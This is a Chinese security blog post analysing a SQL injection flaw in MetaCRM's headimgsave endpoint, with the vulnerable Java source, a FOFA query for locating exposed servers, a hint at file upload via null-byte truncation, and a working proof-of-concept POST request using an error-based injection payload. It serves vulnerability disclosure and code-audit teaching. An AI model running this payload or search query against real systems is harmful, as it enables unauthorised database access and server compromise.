---
title: "美特CRM headimgsave SQL注入漏洞"
source: https://mrxn.net/jswz/metasoft-headimgsave-sqli.html
asset_dir: assets/美特crm-headimgsave-sql注入漏洞
---

# 美特CRM headimgsave SQL注入漏洞

[Mrxn](https://mrxn.net/author/1)- 发表于2025/7/21 12:30
- 912浏览
- [0评论](#comment)
- 31分钟阅读

深入探索

安全

客户关系管理

计算机安全

---

# 漏洞简介

MetaCRM是一款智能平台化CRM[软件](#),通过提升企业管理和协同办公,全面提高企业管理水平和运营效率,帮助企业实现卓越管理。美特CRM headimgsave 接口存在[SQL注入漏洞](https://mrxn.net/tag/SQL%E6%B3%A8%E5%85%A5)，未经身份验证的恶意攻击者利用 SQL 注入漏洞获取数据库中的信息（例如管理员后台密码、站点用户个人信息）之外，攻击者甚至可以在高权限下向服务器写入命令，进一步获取服务器系统权限。

客户关系管理

# 影响版本

# fofa语法

> body="/common/scripts/basic.js" && body="www.metacrm.com.cn"

# 漏洞分析

先看下 web.xml 里对`headimgsave`的相关定义

```
<servlet>
  <servlet-name>ImgController</servlet-name>
  <servlet-class>com.metasoft.wxsconf.headimg.ImgController</servlet-class>
  <load-on-startup>1</load-on-startup>
</servlet>
<servlet-mapping>
  <servlet-name>ImgController</servlet-name>
  <url-pattern>/headimgsave</url-pattern>
</servlet-mapping>
```

深入探索

网络安全课程

网络安全培训

安全认证考试

跟进`ImgController`看下其实现逻辑

SQL注入检测工具

```
public class ImgController extends HttpServlet {
    public void doGet(HttpServletRequest request, HttpServletResponse response) throws IOException, ServletException {
        this.doProcess(request, response);
    }

    public void doPost(HttpServletRequest request, HttpServletResponse response) throws IOException, ServletException {
        this.doProcess(request, response);
    }

    public void doProcess(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {
        response.setContentType("text/html");
        PrintWriter out = response.getWriter();
        Connection conn = null;

        try {
            conn = ResManager.getConnection("default", true);
            UserState us = new UserState();
            JSONObject result = new JSONObject();
            String headimgurl = request.getParameter("headimgurl");
            String accountid = request.getParameter("accountid");
            AccountPO ao = new AccountPO(conn, us);
            if (ao.getAc(accountid)) {
                if (ao.checkImg(accountid)) {
                    result.put("message", "头像已有");
                } else {
                    saveHeadImg(headimgurl, accountid);
                    ao.upHeadImg(accountid);
                    result.put("message", "头像保存成功");
                }
            } else {
                result.put("message", "会员不存在");
            }
```

深入探索

防火墙软件

安全工具开发

在线安全工具

通过`request.getParameter`获取到参数`accountid`后会先进入`getAc`方法然后进入`checkImg`方法,跟进看下其实现逻辑

代码安全审计

```
public boolean getAc(String id) throws SQLException {
    if (StringUtil.isEmpty(id)) {
        return false;
    } else {
        String sql = "select id from account where id='" + id + "'";
        DomainObject[] data = this.findDomain(sql, 0, 0);
        return data != null && data.length > 0;
    }
}
public boolean checkImg(String id) throws SQLException {
    if (StringUtil.isEmpty(id)) {
        return false;
    } else {
        String sql = "select headimg from account where id='" + id + "'";
        DomainObject[] data = this.findDomain(sql, 0, 0);
```

从它的实现可以很清楚的看到参数id被直接拼接进SQL语句中后执行,没有对参数有任何过滤或校验,从而导致[SQL注入漏洞](https://mrxn.net/tag/SQL%E6%B3%A8%E5%85%A5).

同时此处或许还存在任意内容上传,通过上面的注入让其结果返回false进入`saveHeadImg`,可上传任意内容,如果jdk版本低于1.7 还可以通过%00截断保存任意后缀文件.

漏洞修复方案

[![美特CRM headimgsave SQL注入漏洞](images/img-001-ca8b3ef287bf.webp)](https://image.mrxn.net/d2d0341da1124b758bf23918da845180.webp)

# 漏洞复现

```
POST /headimgsave HTTP/1.1
Host: metasoft.mrxn.net
Content-Type: application/x-www-form-urlencoded

accountid=1'and 1<@@VERSION--
```

[![美特CRM headimgsave SQL注入漏洞](images/img-002-7f728671bc34.webp)](https://image.mrxn.net/49f3246fadab43c8bd2c051320f77222.webp)

通过报错注入,成功在响应里回显数据库版本信息

物流软件安全

- 标签：
- [#漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)
- [#web安全](https://mrxn.net/tag/web%E5%AE%89%E5%85%A8)
- [#SQL注入](https://mrxn.net/tag/SQL%E6%B3%A8%E5%85%A5)
- [#代码审计](https://mrxn.net/tag/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1)
- [#Java](https://mrxn.net/tag/Java)

---

文章目录

- [1.漏洞简介](#toc-1-)
- [2.影响版本](#toc-2-)
- [3.fofa语法](#toc-3-)
- [4.漏洞分析](#toc-4-)
- [5.漏洞复现](#toc-5-)

  
  

![](data:image/png;base64,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)

手机扫码阅读
